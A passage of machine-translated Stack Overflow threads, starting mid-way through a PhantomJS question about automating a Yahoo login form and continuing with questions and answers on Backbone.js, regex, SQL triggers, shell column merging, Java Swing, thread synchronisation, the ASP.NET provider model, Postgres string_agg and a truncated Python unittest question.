            console.log(pg);
            pg.evaluate(function() {
                console.log('Page evaluate started');               
                //---
                var loginVar = 'ih5d4hf65465fd45h6@yahoo.com.br';
                var pwdVar = 'itsmypass_445f4hd564hd56f46s'; 
                //---
                $("#login_form #username").value = loginVar;
                $("#login_form #passwd").value = pwdVar;
                //---
            });
            console.log('Rendering');
            pg.render('ystsA.png');
            console.log('Rendered');
        }
        if (typeof jQuery == 'undefined') {  
            console.log('JQuery Loading');  // <<<<==== Execute only until here
            console.log('Source:['+jsLoc+']');
            var rs = page.includeJs(jsLoc, function()  // <<<<===== Fail here, jsLoc was changed to load locally and after tried remotely, i tried use page.injectJs but fail too
            { 
                console.log('JQuery Loaded');  // <<<< ===== Never reach here, no matter if loading local or remote script in include above
                func(page); 
            });
            page.render('ystsB.png');
        } else {
            console.log('JQuery Already Loaded');
            func(page);
            page.render('ystsC.png');
        }
        //-------------------------------------------------
    }
    phantom.exit();
}); 
```

在阅读@g4d564w56 答案后，我没有使用 JQuery，然后我可以填写文本框，但无法单击按钮在登录表单上发布。
查看新代码：

```
console.log('Loading a web page');
var url = 'https://login.yahoo.com/'; 
var page = require('webpage').create();
console.log('Setting error handling');
page.onConsoleMessage = function (msg) {
    console.log(msg);
};
page.onError = function (msg, trace) {
    console.log(msg);
    trace.forEach(function(item) {
        console.log('  ', item.file, ':', item.line);
    })
    phantom.exit();
}
console.log('Error handling is set');
console.log('Opening page');
page.open(url, function (status) {
    if (status != 'success') {
        console.log('F-' + status);
    } else {
        console.log('S-' + status); 
        //-------------------------------------------------     
        var jsLoc = '';
        jsLoc = 'jquery.min.js'; // to load local
        //jsLoc = 'http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js'; // to load remote      
        var act01 = function(pg){
            console.log('Function called');
            console.log('Page evaluating');
            console.log(pg);
            pg.evaluate(function() {
                var getElmById = function(id){
                    return document.getElementById(id);
                }           
                console.log('Page evaluate started');               
               //---
                var loginVar = 'ih5d4hf65465fd45h6@yahoo.com.br';
                var pwdVar = 'itsmypass_445f4hd564hd56f46s'; 
                //---
                getElmById("username").value = loginVar;
                getElmById("passwd").value = pwdVar;
                getElmById("login_form").submit(); /// <<<<==== now its dont work !!!
                //---
            });
            console.log('Rendering');
            pg.render('ystsA.png');
            console.log('Rendered');
        }
        act01(page);
        //-------------------------------------------------
    }
    phantom.exit();
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-05-15T23:58:39.227

我知道这个问题已经在一年前得到了回答，但答案并没有真正解决这个问题。错误原因如下：

> “ [https://login.yahoo.com/上的页面运行了来自](https://login.yahoo.com/)[http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js](http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js)的不安全内容 。”

是登录页面是 https 页面，而您正在尝试加载 http 资源。如果您将 url 更改为[https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js](https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js) ，此错误将消失。花了一段时间才弄清楚。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-06T05:37:18.310

使用谷歌搜索的工作版本。

```
var page, doSearch, displayResults;
page = require('webpage').create();

doSearch = function() {
    console.log('Searching...');
    page.evaluate(function() {
        $("input[name=q]").val('what is phantomjs');
        $("form").trigger('submit');
        return true;
    });
    page.render('phantomjs-searching.png');
};

displayResults = function() {
    console.log('Results...');
    page.evaluate(function() {
        $('h3 a').each(function(i) {
            console.log([i + 1, $(this).text(), ' // ' + $(this).attr('href')].join(': '));
        });
        return true;
    });
    page.render('phantomjs-results.png');
};

page.onLoadFinished = function(status) {
    if (status === 'success') {
        page.includeJs('http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js', function() {
            if (!phantom.state) {
                doSearch();
                phantom.state = 'results';
            } else {
                displayResults();
                phantom.exit();
            }
        });
    } else {
        console.log('Connection failed.');
        phantom.exit();
    }
};

page.onConsoleMessage = function(msg) {
    console.log(msg);
};

page.open('http://google.com'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-06-11T20:28:52.720

尝试来自[http://snippets.aktagon.com/snippets/534-How-to-scrape-web-pages-with-PhantomJS-and-jQuery](http://snippets.aktagon.com/snippets/534-How-to-scrape-web-pages-with-PhantomJS-and-jQuery)的下一个代码。它加载 jQuery 的本地副本，但也可以使用请求页面加载的 jQuery 实例。

```
var page = new WebPage(),
     url = 'http://localhost/a-search-form',
     stepIndex = 0;

 /**
  * From PhantomJS documentation:
  * This callback is invoked when there is a JavaScript console. The callback may accept up to three arguments: 
  * the string for the message, the line number, and the source identifier.
  */
 page.onConsoleMessage = function (msg, line, source) {
     console.log('console> ' + msg);
 };

 /**
  * From PhantomJS documentation:
  * This callback is invoked when there is a JavaScript alert. The only argument passed to the callback is the string for the message.
  */
 page.onAlert = function (msg) {
     console.log('alert!!> ' + msg);
 };

 // Callback is executed each time a page is loaded...
 page.open(url, function (status) {
   if (status === 'success') {
     // State is initially empty. State is persisted between page loads and can be used for identifying which page we're on.
     console.log('============================================');
     console.log('Step "' + stepIndex + '"');
     console.log('============================================');

     // Inject jQuery for scraping (you need to save jquery-1.6.1.min.js in the same folder as this file)
     page.injectJs('jquery-1.6.1.min.js');

     // Our "event loop"
     if(!phantom.state){
       initialize();
     } else {
       phantom.state();
     } 

     // Save screenshot for debugging purposes
     page.render("step" + stepIndex++ + ".png");
   }
 });

 // Step 1
 function initialize() {
   page.evaluate(function() {
     $('form#search input.query').val('Jebus saves');
     $('form#search').submit();
     console.log('Searching...');
   });
   // Phantom state doesn't change between page reloads
   // We use the state to store the search result handler, ie. the next step
   phantom.state = parseResults; 
 }

 // Step 2
 function parseResults() {
   page.evaluate(function() {
     $('#search-result a').each(function(index, link) {
       console.log($(link).attr('href'));
     })
     console.log('Parsed results');
   });
   // If there was a 3rd step we could point to another function
   // but we would have to reload the page for the callback to be called again
   phantom.exit(); 
 } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-11T03:41:40.680

有一个众所周知的错误，即 PhantomJS 无法加载 JQuery，将很难将一些表单数据发布到服务器，但您只能使用 querySelectorAll 选择元素，例如：[如何使用 phantomjs 抓取链接](https://stackoverflow.com/questions/13944518/how-to-scrape-links-with-phantomjs)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-07-06T19:14:24.687

@lmeurs 答案非常好，但不起作用。
我用答案为你创造了一些有用的东西:)。

```
var page = new WebPage();
var url = 'http://br.search.yahoo.com';
var stepIndex = 0;

page.onConsoleMessage = function (msg, line, source) { console.log('console> ' + msg); };

page.onAlert = function (msg) { console.log('alert!!> ' + msg); };

function takeShot(){
    console.log("TakingShot"); 
    page.render("step" + stepIndex + ".png");
    console.log("ShotTake");     
}

function step0() {
    console.log("step 00 enter");
    page.evaluate(function() {
        $("form [type='text']").val('its now sunday searching it');
        $("form [type='submit']").submit();     
    });
    console.log("step 00 exit");
}

function step1() {
    console.log("step 01 enter");
    page.evaluate(function() {
        $('#search-result a').each(function(index, link) {
            console.log($(link).attr('href'));
        })
    });
    console.log("step 01 exit");
    phantom.exit(); 
}

page.open(url, function (status) {
    console.log("[- STARTING -]");
    if (status === 'success') {
        var cmd = ""
        page.injectJs('jquery-1.6.1.min.js');
        while(true)
        {
            console.log("Step["+stepIndex+"] starting on ["+new Date()+"]");
            //cmd = "var x = step"+stepIndex+";"
            //console.log(cmd);
            //eval(cmd);
            switch(stepIndex){
                case 0:
                    step0();
                    break;
                case 1:
                    step1();
                    break;                  
            }
            takeShot();
            stepIndex++;
        }       
    }
}); 
```

# javascript - 在 Backbone.js 中绑定重置

> ID：15847124
> 
> 赞同：1
> 
> 时间：2013-04-06T04:50:54.973
> 
> 标签：javascript, backbone.js

我试图在backbone.js 中做一个简单的集合，但我不明白为什么我的回调函数（在bind 中指定）没有被调用。根据我从文档中了解到的情况，当我执行 fetch() 时，应该触发重置事件。有什么建议么？（代码如下）。

```
 Customer = Backbone.Model.extend(
            );
             CustomerList = Backbone.Collection.extend({
                model : Customer,
                url : "test.php",
            });

            var ChartView = Backbone.View.extend({
                el: $('body'),

                initialize: function(){
                    _.bindAll(this, 'render');
                    this.collection.bind("reset", self.render);
                    this.collection.fetch( 
                    );

                },

                render : function() {
                    console.log("render");
                }

            });

            var chartView = new ChartView( { collection: new CustomerList()} );
        })(jQuery); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T04:58:29.040

如果您使用的是骨干网 1.0.0，您应该通过`reset:true`重置。否则，它将只是`set`以前收藏的模型`update`

```
this.collection.fetch({reset:true}); 
```

确保来自 url 的响应是有效的 json。`reset`事件只会在成功时触发。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-19T10:19:50.203

看一下这个。就像@nikoshr 在 [https://stackoverflow.com/a/16538588/1211174](https://stackoverflow.com/a/16538588/1211174)上所说的那样。有同步事件。因此，每次您可以捕获同步时，都会强制骨干网重置集合

[https://github.com/backbone-paginator/backbone.paginator/issues/164](https://github.com/backbone-paginator/backbone.paginator/issues/164)

```
 this.collection.bind("sync", function(){
                         console.log('got sync');
                         this.render(){, this  ); 
```

# regex - 除最后一个字符外，单词后任何内容的正则表达式

> ID：15847127
> 
> 赞同：2
> 
> 时间：2013-04-06T04:51:04.770
> 
> 标签：regex

除了最后一个字符之外，我需要一个正则表达式来表示单词 typedef 之后的最后一个单词。我知道这`([^typedef]*)$`会给我 typedef 之后的最后一个词，但这将包括最后一个字符。

例如，如果我有这条线`type long long integer;`，我想要一个可以给我的正则表达式，而`integer`不是`integer;`. 如果这有帮助，最后一个字符将始终是分号。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T04:53:53.167

这是应该为您工作的正则表达式：

```
^typedef.*?\s(\w+)\s*; 
```

最后一个单词在匹配组 #1 中可用。

### 现场演示：[http ://www.rubular.com/r/Bzko9WIITw](http://www.rubular.com/r/Bzko9WIITw)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:53:32.317

在括号后添加一个句点以匹配 1 个字符但不捕获它： ([^typedef]*).$

# sql-server-2008 - 如何在触发器中增加月份名称？

> ID：15847132
> 
> 赞同：0
> 
> 时间：2013-04-06T04:52:12.273
> 
> 标签：sql-server-2008, triggers

```
ALTER trigger [dbo].[trg_Billing_TotalFee] on [dbo].[tblBilling] after insert as insert into tblTotalFee(DueFromPreviousMonth,StudentID,MonthName) select RemainingAmount,StudentID,MonthName from inserted 
```

这是我的触发器。我想要的是代替**MonthName**我想要**tbltotalfee**中的**MonthName++**即假设 tblBilling 中的 MonthName 是**一月**然后在**tblTotalFee**我希望将月份插入为**Febraury 。**我该怎么做？

 ******* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:07:00.393

试试这个：

创建一个名为`nextMonths`2 列的表 -`currentMonthName`和`nextMonthName`. 用 currentMonth 和每个对应的 nextMonth 名称填充表。

现在你的触发器应该是：

```
ALTER trigger [dbo].[trg_Billing_TotalFee] 
on [dbo].[tblBilling] after insert as 
insert into tblTotalFee(DueFromPreviousMonth,StudentID,MonthName) 
select RemainingAmount,StudentID,NextMonthName from inserted join nextMonths on inserted.MonthName = nextMonths.currentMonthName 
```******

# python - 从多个文本文件中仅复制一列，并使用 Python 或 Bash 创建一个带有制表符分隔的新列的新文件

> ID：15847145
> 
> 赞同：-4
> 
> 时间：2013-04-06T04:54:19.753
> 
> 标签：python, bash, python-3.x, sed, awk

我有很多文件，每个文件都有以下结构：

文件一：

```
1 x
2 r
3 f
4 t
: :
: :
1000 k 
```

第二文件：

```
1 x
2 r
3 f
4 t
: :
: :
1000 k 
```

有数百个这样的文件。 *我需要一个最终输出文件作为每个文件的制表符分隔的第二列*：

输出文件：

```
x ..More Columns ... q
r ..... w
f ..... e
t ..... l
:       :
:       : 
```

我更喜欢使用 Python 或 Bash 脚本。对不起这个愚蠢的问题。

这是我到目前为止的进展，为每个文件的第二列创建了一个 * 分隔字符串列表。但**没有生成如何编写** 代码的想法：

```
import tkinter.filedialog
def FileToString (fin):
    Result = ''
    for line in fin:
        LineList = line.strip().split(' ')
        Result = Result + '*' + LineList[1]
return (Result)

File = tkinter.filedialog.askopenfilenames(title='Select the Files you want>> >>> >> >>>>')
Filenames = File.split()
Result = []
ArrayResult = []
OutPutFileName = tkinter.filedialog.asksaveasfilename(title='Select or Enter Output File >>     >>>> >>>>')
fout = open(OutPutFileName,'w')
for name in Filenames:
    fin = open(name,'r')
    FileResult = FileToString(fin)
    ArrayResult.append(FileResult) 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:16:38.273

在命令行...

```
paste file1 file2 > file3 
```

这是我的资料来源：[鲜为人知的 Linux 命令：加入、粘贴和排序](http://www.techrepublic.com/article/lesser-known-linux-commands-join-paste-and-sort/5031653)

如果这不是您要查找的内容，请回复，我会努力解决的。

* * *

试试这个……把“file*”和“out.txt”改成你需要的样子。

```
#!/bin/sh
outFile=out.txt
tmpFile=$$.tmp
for FILE in `ls file*`
do
    if [ ! -f ${tmpFile} ]; then
        # Need to seed the tmp file one first pass
        cp ${FILE} ${tmpFile}
        continue
    fi
    paste ${tmpFile} ${FILE} > ${outFile}
    mv ${outFile} ${tmpFile}
done
# Move the tmp file to output file
mv ${tmpFile} ${outFile} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T05:17:58.227

```
awk '
{ a[FNR] = a[FNR] (NR==FNR?"":"\t") $2 }
END{ for (i=1;i<=FNR;i++) print a[i] }
' file1 file2 file3 .... 
```

# c# - 局部变量的 C# 命名指南

> ID：15847147
> 
> 赞同：-5
> 
> 时间：2013-04-06T04:55:22.537
> 
> 标签：c#, naming-conventions, design-guidelines

关于C#方法中取同名参数的局部变量命名的问题请看下面的代码

```
 private int DoSomething(string activationCode)
    {
        ...

        int ??WhatNameToChooseHere?? = Convert.ToInt32(activationCode);

        ...
    } 
```

在上述情况下应用什么可能是一个好的策略

注意：方法参数和局部变量仅因类型而异

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T04:58:52.293

你不能这样做。正确的做法是用不同的名称命名变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:58:54.993

```
private int DoSomething(string activationCodeStoredInStringAndPassedAsAnArgument)    {
    int activationCodeThatDeclaredAsAnIntegerToStoreTheValueConvertedFromString = Convert.ToInt32(activationCodeStoredInStringAndPassedAsAnArgument);
} 
```

# java - JTabbedPane 中的 JButton

> ID：15847156
> 
> 赞同：1
> 
> 时间：2013-04-06T04:58:26.657
> 
> 标签：java, swing, user-interface, mouse

我正在用 JTabbedPane 和 JButton 编写一个交互式程序。到目前为止，我已经做到了，所以当单击“预订航班”选项卡时，会显示此面板：

[![IMG](https://i.stack.imgur.com/vMkna.png)](https://i.stack.imgur.com/vMkna.png)

我想要一个在我单击任一按钮时也将使用 MouseListener 来显示的图像。那个代码会是什么样子？

这是我目前的方法：

显示图像：

```
protected JComponent makeImagePanel(String path) 
{
    try{
        JPanel panel = new JPanel(false);
        BufferedImage myPicture = ImageIO.read(new File(path));
        JLabel picLabel = new JLabel(new ImageIcon( myPicture ));
        panel.add(picLabel);

        return panel;
    }catch (IOException e)
    {
        throw new IllegalArgumentException("Unable to load" + path);
    }

} 
```

和鼠标事件：

```
 protected JComponent FlightOptions()
   {
    JPanel panel= new JPanel(false);
    JButton international= new JButton("International Flights");
    JButton domestic= new JButton("Domestic Flights");
    international.setVerticalTextPosition (AbstractButton.CENTER);
    international.setHorizontalTextPosition(AbstractButton.LEADING);
    domestic.setVerticalTextPosition (AbstractButton.CENTER);
    domestic.setHorizontalTextPosition(AbstractButton.LEADING);
    international.setActionCommand("international");
    domestic.setActionCommand("domestic");
    international.setEnabled(true);
    MouseAdapter2 mouse= new MouseAdapter2();
    international.addMouseListener(mouse);
    domestic.addMouseListener(mouse);
    panel.setLayout(new GridLayout(1, 1));
    panel.add(international);
    panel.add(domestic);
    return panel;
}
class MouseAdapter2 extends MouseAdapter {

    public void mousePressed(MouseEvent e) {
        JButton buttonpressed = (JButton)e.getSource();
        if(buttonpressed==international)
        {
            reservation= makeImagePanel("international_1.gif");
            overview.addTab("International Flight", reservation);

        }
    } 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:07:35.270

你可以通过使用

```
jButton2.setPressedIcon(new javax.swing.ImageIcon(getClass().getResource("/newpackage/Water lilies.jpg"))); 
```

> **运行这段代码，看看它是如何工作的**

**更新 2**

```
import javax.swing.JFrame;
import javax.swing.JOptionPane;

public class Sample extends javax.swing.JFrame {
    public Sample() {
        initComponents();
    }
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        jTabbedPane1 = new javax.swing.JTabbedPane();
        jPanel2 = new javax.swing.JPanel();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jPanel2.setLayout(new java.awt.GridLayout());

        jButton1.setText("jButton1");
        jButton1.setPressedIcon(new javax.swing.ImageIcon(getClass().getResource("/newpackage/Blue hills.jpg"))); // NOI18N
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });
        jPanel2.add(jButton1);

        jButton2.setText("jButton1");
        jButton2.setPressedIcon(new javax.swing.ImageIcon(getClass().getResource("/newpackage/Water lilies.jpg"))); // NOI18N
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });
        jPanel2.add(jButton2);

        jTabbedPane1.addTab("tab2", jPanel2);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 400, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 300, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {

    ImagePanel panel = new ImagePanel();
    // display the jpanel in a joptionpane dialog, using showMessageDialog
    JFrame frame = new JFrame("JOptionPane showMessageDialog component example");
    JOptionPane.showMessageDialog(frame, panel);
    }

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {
    ImagePanel2 panel = new ImagePanel2();
    // display the jpanel in a joptionpane dialog, using showMessageDialog
    JFrame frame = new JFrame("JOptionPane showMessageDialog component example");
    JOptionPane.showMessageDialog(frame, panel);
    }

    public static void main(String args[]) {

        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">

        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Sample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Sample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Sample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Sample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new Sample().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JTabbedPane jTabbedPane1;
    // End of variables declaration
} 
```

**图像面板.java**

```
public class ImagePanel extends javax.swing.JPanel {
    public ImagePanel() {
        initComponents();
    }
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        jLabel1 = new javax.swing.JLabel();

        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/newpackage/Blue hills.jpg"))); // NOI18N

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);
        this.setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, 609, Short.MAX_VALUE)
        );
    }// </editor-fold>
    // Variables declaration - do not modify
    private javax.swing.JLabel jLabel1;
    // End of variables declaration
} 
```

**ImagePanel2.java**

```
public class ImagePanel2 extends javax.swing.JPanel {
    public ImagePanel2() {
        initComponents();
    }
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        jLabel1 = new javax.swing.JLabel();

        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/newpackage/Water lilies.jpg"))); // NOI18N

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);
        this.setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
    }// </editor-fold>
    // Variables declaration - do not modify
    private javax.swing.JLabel jLabel1;
    // End of variables declaration
} 
```

# java - 线程同步。以正确的方式打印值

> ID：15847160
> 
> 赞同：1
> 
> 时间：2013-04-06T04:58:40.107
> 
> 标签：java, multithreading

我无法找到这个问题的解决方案。我在某些时候搞砸了，但不确定。请提出您的建议来克服这个问题。

问题：

有三个数组，每个数组都分配给线程，输出应该是按顺序...

t1 ={1,4,7} t2 ={2,5,8} t3 ={3,6,9}

预期产出

出 = {1,2,3,4,5,6,7,8,9}

我试过：

```
public class Worker extends Thread {
    Worker next;
    int[] val;
    Object lock = new Object();

    Worker(int[] val) {

        this.val = val;
    }

    public void setnext(Worker next) {
        this.next = next;
    }

    @Override
    public void run() {
        for (int i = 0; i < val.length; i++) {
            synchronized (this) {
                synchronized (next) {

                    System.out.println(val[i]);
                    next.notify();

                }

                synchronized (this) {
                    try {

                        this.wait();
                    } catch (InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            }
            synchronized(next){
                next.notify();
            }
        }
    }
} 
```

和测试班

```
public class TestWorker {
    public static void main(String[] args) throws Exception{
        Worker worker1 = new Worker(new int[]{1,4,7});
        Worker worker2 = new Worker(new int[]{2,5,8});
        Worker worker3 = new Worker(new int[]{3,6,9});

        worker1.setnext(worker3);
        worker2.setnext(worker1);
        worker3.setnext(worker2);

        worker1.start();
        worker2.start();
        worker3.start();

    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:20:32.973

试试我的版本。请注意，等待应始终在循环中使用。

```
public class Worker extends Thread {
    int[] val;
    Worker next;
    boolean ready;
    boolean go;

    Worker(int[] val) {
        this.val = val;
    }

    public void setNext(Worker next) {
        this.next = next;
    }

    @Override
    public void run() {
        synchronized (Worker.class) {
            ready = true;
            Worker.class.notifyAll();
            for (int i = 0; i < val.length; i++) {
                try {
                    while (!go) {
                        Worker.class.wait();
                    }
                    System.out.println(val[i]);
                    go = false;
                    next.go = true;
                    Worker.class.notifyAll();
                } catch (InterruptedException e) {
                }
            }
        }
    }

    public static void main(String[] args) throws Exception {
        Worker worker1 = new Worker(new int[] { 1, 4, 7 });
        Worker worker2 = new Worker(new int[] { 2, 5, 8 });
        Worker worker3 = new Worker(new int[] { 3, 6, 9 });

        worker1.setNext(worker2);
        worker2.setNext(worker3);
        worker3.setNext(worker1);

        worker1.start();
        worker2.start();
        worker3.start();

        synchronized (Worker.class) {
            while(!worker1.ready || !worker2.ready ||!worker3.ready ) {
                Worker.class.wait();
            }
            worker1.go = true;
            Worker.class.notifyAll();
        }
    }
} 
```

输出

```
1
2
3
4
5
6
7
8
9 
```

# c# - 依赖倒置原则在 ASP.NET 提供者模型中的应用

> ID：15847167
> 
> 赞同：3
> 
> 时间：2013-04-06T05:00:02.340
> 
> 标签：c#, asp.net, .net, oop, dependency-injection

我有一个使用`IPaymentService`处理信用卡付款的应用程序。通过使用[ASP.NET Provider Model](http://msdn.microsoft.com/en-us/library/aa479030.aspx)将适当的实现（`CreditCardPaymentComponent`或`CheckPaymentComponent`实现接口的任何其他东西`IPaymentService`）注入到应用程序中。`PaymentProvider`

我们还需要这些组件可重用于可能无法访问`PaymentProvider`.

问题是在哪里放置`IPaymentService`接口？它不能在应用程序内部，因为有多个应用程序需要使用该服务。它不能在服务内部，因为有多个服务实现了这个接口。我不喜欢将接口放在他们自己的项目中，因为我必须在任何地方添加引用。还有其他解决方案吗？![提供者模型](https://i.stack.imgur.com/rZhd3.png)

**编辑：**澄清一下，使用提供者模型的目的是我们可以支持其他开发人员，这样他们就可以编写例如`CustomPaymentComponent`哪些实现`IPaymentService`并且它与我们的应用程序无缝协作。我倾向于@Frazell 的回答，但我只是想知道`IPaymentService`与 s 放入同一个程序集是否有任何不利之处`PaymentComponent`？如果你必须`CustomPaymentComponent`为这个系统开发一个，什么对你最有意义？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:15:20.180

您无法逃避必须在需要的地方引用接口和实现代码。如果支付代码必须在许多应用程序中可重用，我会将其分解为一个单独的库 (dll) 并适当地打包它。

管理额外的程序集比诉诸代码复制要容易得多，这是唯一的选择。必须不惜一切代价避免重复。

取决于你在做什么。我将在同一个程序集（例如支付程序集）中提供接口和基本实现，并允许使用 DI 在边缘情况下根据需要交换实现。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T12:49:46.310

解决方案其实很简单：

> **使用适配器模式。**

您根本不让组件实现该接口，而是基于该接口为每个组件实现适配器。在这种情况下，适配器和接口可以放在一起：

```
class CreditCardPaymentServiceAdapter : IPaymentService 
{
   private CreditCardPaymentService service;

    public CreditCardPaymentServiceAdapter(
        CreditCardPaymentService service)
    {
        this.service = service;
    }

    // Implement IPaymentService here and forward
    // to the CreditCardPaymentService.
} 
```

该适配器本身将不包含业务逻辑，而只会映射/转换/适应真实`CreditCardPaymentService`并暴露`IPaymentService`（或适合该应用程序的接口）。

如果您有多个应用程序，您可能会被迫复制这些适配器和接口。这就是缺点。

# sql - 将一列的多个结果行连接成一个，按另一列分组

> ID：15847173
> 
> 赞同：175
> 
> 时间：2013-04-06T05:00:27.257
> 
> 标签：sql, postgresql, aggregate-functions

我有一张这样的桌子

```
Movie   Actor   
  A       1
  A       2
  A       3
  B       4 
```

我想获取电影的名称和该电影中的所有演员，并且我希望结果采用如下格式：

```
Movie   ActorList
 A       1, 2, 3 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：319
> 
> 时间：2013-04-06T11:44:03.763

使用聚合函数更简单[**`string_agg()`**](https://www.postgresql.org/docs/current/functions-aggregate.html)（Postgres 9.0 或更高版本）：

```
SELECT movie, string_agg(actor, ', ') AS actor_list
FROM   tbl
GROUP  BY 1; 
```

在这种情况下， `1`in`GROUP BY 1`是位置参考和快捷方式`GROUP BY movie`。

`string_agg()`期望数据类型`text`作为输入。其他类型需要显式转换 ( `actor::text`) -*除非*定义了隐式转换`text`- 所有其他字符类型 ( `varchar`, `character`, `"char"`) 和其他一些类型都是这种情况。

正如[isapir 评论](https://stackoverflow.com/questions/15847173/concatenate-multiple-result-rows-of-one-column-into-one-group-by-another-column/15850510#comment80744041_15850510)的那样，您可以`ORDER BY`在聚合调用中添加一个子句以获取排序列表 - 如果您需要的话。像：

```
SELECT movie, string_agg(actor, ', ' **ORDER BY actor**) AS actor_list
FROM   tbl
GROUP  BY 1;
```

但在子查询中对行进行排序通常更快。看：

*   [Postgres SQL - 在选择中创建数组](https://stackoverflow.com/questions/9796092/postgres-sql-create-array-in-select/9796438#9796438)

* * *

## 回答 #2

> 赞同：72
> 
> 时间：2013-04-06T05:10:06.493

您可以`array_agg`为此使用函数：

```
SELECT "Movie",
array_to_string(array_agg(distinct "Actor"),',') AS Actor
FROM Table1
GROUP BY "Movie"; 
```

结果：

| 电影 | 演员 |
| --- | --- |
| 一种 | 1,2,3 |
| 乙 | 4 |

看到[这个 SQLFiddle](http://sqlfiddle.com/#!17/62f90/1)

有关更多信息，请参阅[9.18。聚合函数](http://www.postgresql.org/docs/8.4/static/functions-aggregate.html)

# python - 如何使用 unittest 正确编写测试？

> ID：15847175
> 
> 赞同：0
> 
> 时间：2013-04-06T05:00:31.033
> 
> 标签：python, math, testing, import, numbers

我试图弄清楚如何为我用 Python 编写的函数编写单元测试 - 这是下面编写的代码：

```
def num_buses(n):
    import math
    """ (int) -> int

    Precondition: n >= 0

